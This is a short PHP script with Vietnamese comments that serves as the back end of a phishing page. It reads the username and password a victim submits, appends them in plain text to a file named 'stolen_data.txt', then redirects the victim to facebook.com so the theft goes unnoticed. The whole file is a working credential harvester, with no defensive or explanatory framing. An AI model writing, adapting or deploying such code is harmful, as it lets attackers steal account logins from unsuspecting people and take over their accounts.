<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Lưu dữ liệu vào file
    $logFile = 'stolen_data.txt';
    $entry = "Username: $username | Password: $password\n";
    file_put_contents($logFile, $entry, FILE_APPEND);

    // Chuyển hướng người dùng về trang thật
    header('Location: https://facebook.com');
    exit();
}
?>
